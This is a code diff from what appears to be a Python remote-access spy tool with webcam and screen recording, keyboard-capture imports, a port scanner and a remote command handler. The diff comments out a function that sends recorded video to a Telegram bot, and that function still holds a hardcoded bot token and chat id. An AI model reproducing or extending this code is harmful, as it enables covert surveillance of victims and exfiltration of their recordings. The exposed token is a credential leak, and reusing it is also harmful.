@@ -1,4 +1,4 @@
-import socket, cv2, threading, struct, pickle, pyautogui, datetime, requests, time, subprocess, os, keyboard, telebot, shutil, stat, mimetypes
+import socket, cv2, threading, struct, pickle, pyautogui, datetime, requests, time, subprocess, os, keyboard, shutil, stat, mimetypes
 from requests import get
 from pynput import keyboard
 import smtplib  # Импортируем библиотеку по работе с SMTP
@@ -22,9 +22,9 @@ class Scanner():
 
 
     def scan(self):
-        for el in ports:
+        for el in self.ports:
             try:
-                s.connect((self.ip, el))
+                self.s.connect((self.ip, el))
             except:
                 pass
             else:
@@ -854,7 +854,8 @@ def v1deo(tm, s=None, ip="192.168.0.12"):
                 break
         except KeyboardInterrupt as e:
             out.release()
-            send_video(str(tm) + ".avi")
+            # send_video(str(tm) + ".avi")
+            pass
             # print(str(tm) + ".avi")
             print(e)
             exit(1)
@@ -866,20 +867,20 @@ def v1deo(tm, s=None, ip="192.168.0.12"):
     return str(tm) + ".avi", s
 
 
-def send_video(path='output.avi'):
-    global message
-    global bot
-    import telebot
-    bot = telebot.TeleBot('5158577409:AAE9OzHkFI-rKICyZTyPgH4yZnRdIEOsH9s')  # token
-
-    @bot.message_handler(commands=['stp'])
-    def stop_command():
-        # print("ok")
-        bot.stop_polling()
-
-    bot.send_video(1251720329, video=open(path, 'rb'), supports_streaming=True)  # first parameter is your telegram id
-    stop_command()
-    # bot.polling(none_stop=False, interval=0)
+# def send_video(path='output.avi'):
+#     global message
+#     global bot
+#     import telebot
+#     bot = telebot.TeleBot('5158577409:AAE9OzHkFI-rKICyZTyPgH4yZnRdIEOsH9s')  # token
+#
+#     @bot.message_handler(commands=['stp'])
+#     def stop_command():
+#         # print("ok")
+#         bot.stop_polling()
+#
+#     bot.send_video(1251720329, video=open(path, 'rb'), supports_streaming=True)  # first parameter is your telegram id
+#     stop_command()
+#     # bot.polling(none_stop=False, interval=0)
 
 
 def ch_dir(dir):
@@ -1210,9 +1211,6 @@ def spy(cmd_dt, s, ip):
         camera.stop_stream()
 
 
-def scan(ip, ports):
-    nm = nmap.PortScanner()
-
 
 
 
@@ -1262,7 +1260,8 @@ def MAIN(command, s, ip):
         timer = int(command.split(" ")[-1])
         _ = ti(timer, 0)
         pathr = video(_, timer)
-        send_video(pathr)
+        # send_video(pathr)
+        pass
         os.remove(pathr)
     elif "delete" == command.split(" ")[0]:
         if os.path.isfile((command.split(" "))[-1]):
